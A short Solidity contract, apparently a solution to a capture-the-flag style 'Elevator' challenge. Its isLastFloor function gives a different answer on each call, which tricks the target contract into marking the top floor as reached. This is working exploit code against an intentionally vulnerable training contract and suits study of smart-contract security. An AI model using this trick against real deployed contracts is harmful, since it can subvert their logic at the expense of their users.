// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./Elevator.sol";
import "hardhat/console.sol";

contract ElevatorAttacker {
  using SafeMath for uint256;
  Elevator target;
  bool firstCall = true;

  constructor(address _target) public {
    target = Elevator(_target);
  }

  function attack() public {
    target.goTo(1);
  }

  function isLastFloor(uint256 _floor) external returns (bool) {
    if (firstCall) {
      firstCall = false;
      return false;
    } else return true;
  }
}
